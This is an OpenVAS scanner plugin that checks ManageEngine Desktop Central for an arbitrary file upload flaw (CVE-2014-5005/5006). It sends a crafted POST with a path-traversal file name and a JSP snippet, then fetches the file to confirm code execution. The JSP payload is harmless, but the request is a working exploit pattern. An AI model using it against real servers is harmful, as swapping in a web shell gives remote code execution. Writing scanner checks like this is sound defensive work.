###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manageengine_desktopcentral_69494.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Multiple ManageEngine Products Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:zohocorp:manageengine_desktop_central";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105084");
  script_bugtraq_id(69494, 69493);
  script_cve_id("CVE-2014-5005", "CVE-2014-5006");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 13994 $");
  script_name("Multiple ManageEngine Products  Arbitrary File Upload Vulnerability");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2014-09-09 13:20:38 +0200 (Tue, 09 Sep 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_manage_engine_desktop_central_detect.nasl");
  script_mandatory_keys("ManageEngine/Desktop_Central/installed");
  script_require_ports("Services/www", 8020);

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/69494");

  script_tag(name:"impact", value:"An attacker may leverage this issue to upload arbitrary files to the
  affected computer. This can result in arbitrary code execution within the context of the vulnerable application.");

  script_tag(name:"vuldetect", value:"Check if it is possible to upload a file.");

  script_tag(name:"solution", value:"Ask the vendor for an update.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Multiple ManageEngine Products are prone to an arbitrary-file-upload
  vulnerability.");

  script_tag(name:"affected", value:"ManageEngine Desktop Central versions 7 through 9 build 90054
  ManageEngine Desktop Central MSP.");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

useragent = http_get_user_agent();

host = http_host_name( port:port );
vtstrings = get_vt_strings();
vt_string_lo = vtstrings["lowercase"];
vt_string = vtstrings["default"];

pat = vt_string + " RCE Test";
ex = '<%= new String("' + pat + '") %>';
len = strlen( ex );
file = vt_string_lo + '_' + rand() + '.jsp';
url = dir + '/statusUpdate?actionToCall=LFU&customerId=1337&fileName=../../../../../../' + file + '&configDataID=1';

req = 'POST ' + url + ' HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Content-Length: ' + len + '\r\n' +
      'Accept: */*\r\n' +
      'Content-Type: multipart/form-data;\r\n' +
      '\r\n' +
      ex;
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

url = dir + "/" + file;
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( pat >< buf ) {
  report  = 'It was possible to upload the file "' + dir + '/' + file + '". Please delete this file.';
  report += '\n' + report_vuln_url( url:url, port:port );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );